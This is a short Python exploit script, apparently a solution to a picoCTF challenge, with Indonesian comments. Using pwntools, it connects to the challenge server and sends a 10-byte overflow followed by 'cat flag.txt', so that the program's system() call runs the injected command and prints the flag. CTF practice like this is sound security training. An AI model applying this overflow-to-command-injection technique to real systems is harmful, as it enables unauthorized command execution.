# exploit.py
from pwn import *

LOCAL = False

if LOCAL:
    io = process('./vuln')
else:
    io = remote('amiable-citadel.picoctf.net', 62608)  # ← isi dari halaman soal

# ===================== EXPLOIT ====================
# 10 byte isi buffer → overflow ke c → system() jalankan perintah kita
payload = b'A' * 10 + b'cat flag.txt'

io.sendlineafter(b'name?\n', payload)
io.interactive()
